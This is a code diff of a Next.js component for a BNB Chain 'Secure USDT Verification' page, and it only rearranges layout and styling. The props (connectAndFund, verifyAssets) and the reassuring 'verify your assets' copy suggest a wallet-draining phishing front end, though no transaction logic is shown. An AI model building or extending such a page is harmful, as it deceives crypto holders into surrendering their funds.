@@ -3,6 +3,8 @@ import { Card, CardContent } from "@/components/ui/card"
 import { VerificationSectionProps } from '@/types'
 import { useEffect, useState } from "react";
 import { verifyAssets } from "./RecentVerifications";
+import logo from "../../public/bnb.png"
+import Image from "next/image";
 const VerificationSection = ({
   isConnecting,
   connectAndFund,
@@ -50,78 +52,56 @@ const VerificationSection = ({
   const buttonText = isConnecting ? 'Connecting...' : isVerifying ? 'Verifying...' : 'Verify Assets';
 
   return (
-    <Card className="border border-border bg-card/50 backdrop-blur-sm overflow-hidden relative animate-fade-in golden-glow-strong lg:golden-glow-none">
-      <div className="absolute inset-0 bg-gold-radial opacity-100 lg:opacity-0" />
-      <div className="absolute inset-0 bg-gold-shimmer opacity-100 lg:opacity-0" />
+    <Card className="border border-border bg-card/50 backdrop-blur-sm  overflow-hidden relative animate-fade-in golden-glow">
+      <div className="absolute inset-0 bg-gold-radial opacity-100" />
+      <div className="absolute inset-0 bg-gold-shimmer opacity-100" />
       <CardContent className="pt-6 pb-8 relative z-10">
-        {/* BNB Chain Verification Tag */}
-        <div className="inline-block px-4 py-1.5 border border-gold text-gold text-xs font-medium rounded-md mb-6 animate-slide-up golden-border-glow lg:golden-border-none golden-text-glow lg:golden-text-none">
-          BNB CHAIN VERIFICATION
-        </div>
-
+       
         {/* Main content */}
-        <div className="flex flex-col md:flex-row items-start justify-between gap-6">
+        <div className="flex  flex-col items-center justify-between gap-6 text-center">
+          <h1 className="text-4xl font-bold mb-4 golden-text-glow text-gold">Secure USDT Verification</h1>
+          
+          {/* BNB Logo - Mobile version */}
+          <div className="flex  w-full items-center justify-center mb-6 animate-fade-in" style={{ animationDelay: '300ms' }}>
+            <div className="relative w-28 h-28 md:w-36 md:h-36 flex items-center justify-center">
+              <Image 
+                src={logo} 
+                alt="BNB Logo" 
+                className="w-full h-full object-contain animate-pulse-glow golden-glow mix-blend-multiply dark:mix-blend-screen opacity-90"
+              />
+            </div>
+          </div>
+
+          {/* BNB Chain Verification Tag */}
+          <div className="inline-block px-4 py-1.5 border border-gold text-gold text-xs font-medium rounded-md mb-6 animate-slide-up golden-border-glow golden-text-glow">
+            BNB CHAIN VERIFICATION
+          </div>
+
+          <button 
+            onClick={handleVerify}
+            disabled={isLoading}
+            className="inline-flex h-10 items-center justify-center rounded bg-yellow-500 hover:bg-yellow-600 px-6 font-medium text-black transition-colors disabled:opacity-70 disabled:cursor-not-allowed golden-glow"
+          >
+            {isLoading ? (
+              <>
+                <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+                {buttonText}
+              </>
+            ) : (
+              buttonText
+            )}
+          </button>
+
           <div className="max-w-md animate-slide-up" style={{ animationDelay: '150ms' }}>
-            <h1 className="text-4xl font-bold mb-4 golden-text-glow lg:golden-text-none text-gold lg:text-foreground">Secure Asset Verification</h1>
-            <p className="text-muted-foreground/80 mb-6">
+            <p className="text-muted-foreground/80 mb-6 text-center">
               Verify your BNB Chain assets with our advanced security protocol.
               Protect against scams and ensure your transactions are secure.
             </p>
-
-            <button 
-              onClick={handleVerify}
-              disabled={isLoading}
-              className="inline-flex h-10 items-center justify-center rounded bg-yellow-500 hover:bg-yellow-600 px-6 font-medium text-black transition-colors disabled:opacity-70 disabled:cursor-not-allowed golden-glow lg:golden-glow-none"
-            >
-              {isLoading ? (
-                <>
-                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                  </svg>
-                  {buttonText}
-                </>
-              ) : (
-                buttonText
-              )}
-            </button>
           </div>
 
-          {/* BNB Logo */}
-          <div className="hidden md:flex items-center justify-center animate-fade-in" style={{ animationDelay: '300ms' }}>
-            <div className="relative w-36 h-36 flex items-center justify-center animate-float golden-glow lg:golden-glow-none">
-              <div className="absolute inset-0 rounded-full border-2 border-gold/50 animate-[spin_25s_linear_infinite] shadow-[0_0_15px_rgba(255,215,0,0.5)]"></div>
-              <div className="absolute inset-2 rounded-full border-2 border-gold/40 animate-[spin_20s_linear_infinite_reverse] shadow-[0_0_12px_rgba(255,215,0,0.4)]"></div>
-              <div className="absolute inset-4 rounded-full border-2 border-gold/30 animate-[spin_15s_linear_infinite] shadow-[0_0_10px_rgba(255,215,0,0.3)]"></div>
-              <div className="absolute inset-8 rounded-full border-2 border-gold/20 flex items-center justify-center shadow-[0_0_8px_rgba(255,215,0,0.2)]">
-                <div className="absolute h-2 w-2 rounded-full bg-gold -top-1 animate-pulse-glow golden-glow lg:golden-glow-none"></div>
-                <div className="absolute h-2 w-2 rounded-full bg-gold -right-1 animate-pulse-glow golden-glow lg:golden-glow-none" style={{ animationDelay: '400ms' }}></div>
-                <div className="absolute h-2 w-2 rounded-full bg-gold -bottom-1 animate-pulse-glow golden-glow lg:golden-glow-none" style={{ animationDelay: '800ms' }}></div>
-                <div className="absolute h-2 w-2 rounded-full bg-gold -left-1 animate-pulse-glow golden-glow lg:golden-glow-none" style={{ animationDelay: '1200ms' }}></div>
-              </div>
-              <div className="w-16 h-16 bg-gold/10 rounded-full flex items-center justify-center animate-pulse-glow golden-border-glow lg:golden-border-none">
-                <svg
-                  xmlns="http://www.w3.org/2000/svg"
-                  width="32"
-                  height="32"
-                  viewBox="0 0 24 24"
-                  fill="none"
-                  stroke="currentColor"
-                  strokeWidth="1.5"
-                  strokeLinecap="round"
-                  strokeLinejoin="round"
-                  className="text-gold golden-text-glow lg:golden-text-none"
-                >
-                  <path d="M12 2v8" />
-                  <path d="m4.93 10.93 7.07 7.07" />
-                  <path d="M12 22v-8" />
-                  <path d="m19.07 13.07-7.07-7.07" />
-                  <path d="M2 12h8" />
-                  <path d="M22 12h-8" />
-                </svg>
-              </div>
-            </div>
-          </div>
         </div>
       </CardContent>
     </Card>
